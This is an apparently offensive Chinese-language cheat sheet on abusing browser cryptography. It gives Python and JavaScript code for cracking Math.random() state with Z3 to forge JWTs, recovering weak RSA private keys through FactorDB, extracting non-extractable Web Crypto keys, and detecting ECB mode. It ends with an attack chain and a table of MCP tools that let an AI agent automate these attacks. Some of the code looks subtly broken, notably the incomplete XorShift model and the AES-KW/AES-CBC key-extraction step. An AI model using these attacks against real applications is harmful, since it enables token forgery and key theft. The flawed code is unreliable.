# Web Crypto API 滥用

## Math.random() PRNG 破解 (V8 XorShift128+)

```python
# 如果密钥由 Math.random() 生成 → V8 XorShift128+ 可逆推
# 需要约 25 个连续 random 输出 → Z3 solver 恢复状态

from z3 import *

def crack_math_random(observed_values: list[float]) -> list[int]:
    """从 Math.random() 输出恢复 V8 PRNG 状态"""
    # Math.random() = (state0 + state1) / 2^64
    # XorShift128+: state1 ^= state1 << 23; state = (state1, state0, state1 >> 17, state1 >> 26)

    s = Solver()
    state0 = BitVec('state0', 64)
    state1 = BitVec('state1', 64)

    states = [state0, state1]
    recovered = []

    for obs in observed_values:
        # 解: obs * 2^64 ≈ state0 + state1
        target = int(obs * (2**64))
        s.add(URem(states[-2] + states[-1], 2**64) == target)

        if s.check() == sat:
            m = s.model()
            s0, s1 = m[state0].as_long(), m[state1].as_long()
            recovered = [s0, s1]
            break

    return recovered

# 拿到状态后，预测所有后续 random → 重算密钥
# 在 TSG CTF 2024 中，用此方法恢复 JWT secret 和 encryption key
```

## 弱 RSA 密钥分解

```python
# 如果 JS 生成 RSA 时使用了可分解的 modulus
# → 从 JS bundle 提取 n → FactorDB 分解 → 导出私钥

import requests, base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def recover_rsa_private(n_hex: str) -> RSA.RsaKey:
    """从弱 n 恢复 RSA 私钥"""
    n = int(n_hex, 16)

    # Step 1: FactorDB 查询
    r = requests.get(f"http://factordb.com/api", params={"query": str(n)})
    factors = r.json().get("factors", [])
    if len(factors) < 2:
        return None

    p = int(factors[0][0])
    q = int(factors[1][0])
    e = 65537  # 常见 e

    # Step 2: 计算私钥
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)

    # Step 3: 构造 RSA 私钥
    key = RSA.construct((n, e, d, p, q))
    return key

# 用私钥解密 JWE 或签名 JWT
def forge_jwe_token(jwe_token: str, n_hex: str) -> dict:
    key = recover_rsa_private(n_hex)
    from jose import jwe
    payload = jwe.decrypt(jwe_token, key.export_key())
    return json.loads(payload)
```

## extractable: false 绕过

```javascript
// Web Crypto API: extractable: false → 不能 exportKey()
// 但如果有 wrapKey 权限 → 可以 wrap 其他 key → 导出 wrapped key bytes

async function bypass_extractable(key_to_extract, wrapping_key) {
    // wrapping_key 必须同时有 wrapKey 和 decrypt 权限
    // Step 1: wrap key_to_extract
    const wrapped = await crypto.subtle.wrapKey(
        'raw',                     // 导出为 raw
        key_to_extract,            // 我们要窃取的 key
        wrapping_key,              // 用这个 key 加密
        {name: 'AES-KW'}           // key wrapping algorithm
    );

    // Step 2: 用 wrapping_key 解密 wrapped bytes → 拿到 raw key!
    const raw_key = await crypto.subtle.decrypt(
        {name: 'AES-CBC', iv: new Uint8Array(16)},
        wrapping_key,
        wrapped.slice(8)  // 去掉 KW 头
    );
    console.log("Extracted key:", new Uint8Array(raw_key));
    return raw_key;
}
```

## CryptoJS ECB 降级

```python
# CryptoJS 默认 CBC，但如果 mode 可控 → 强制 ECB → 电码本模式
# ECB: 相同明文块 = 相同密文块 → 信息泄露 → 模式识别攻击

# 探测加密模式:
# 输入: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (32个A)
# ECB → 密文分块相同 → 可直接识别重复块
# CBC → 需要知道 IV
# CTR → 流密码，不需要 padding

def detect_crypto_mode(encrypt_oracle, block_size: int = 16):
    """探测加密模式"""
    plain = b"A" * (block_size * 3)  # 3 个相同块
    cipher = encrypt_oracle(plain)
    blocks = [cipher[i:i+block_size] for i in range(0, len(cipher), block_size)]
    if blocks[1] == blocks[2]:
        return "ECB"
    else:
        return "CBC/CTR/其他"
```

## 攻击链

```
Math.random() PRNG crack → Z3 状态恢复 → 密钥预测 → JWT 伪造
弱 RSA modulus → FactorDB 分解 → 私钥恢复 → JWE 解密 / JWT 签名
extractable:false bypass → wrapKey + decrypt → raw key export → 密钥泄露
CryptoJS ECB 模式 → 电码本分析 → 明文恢复 → 密码/session 数据
Web Crypto importKey → 恶意 JWK → key_ops 设 wrapKey+decrypt → 密钥窃取
```

## Evidence

记录: PRNG 输出的前 30 个值、n 的 FactorDB 结果、wrapped key hex、加密模式检测结果

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| Web Crypto 端点探测 | `http_probe` | HTTP GET 探测 Web Crypto 相关端点 |
| 知识检索 | `kb_router` | 按 Web Crypto 攻击信号搜索知识库 |
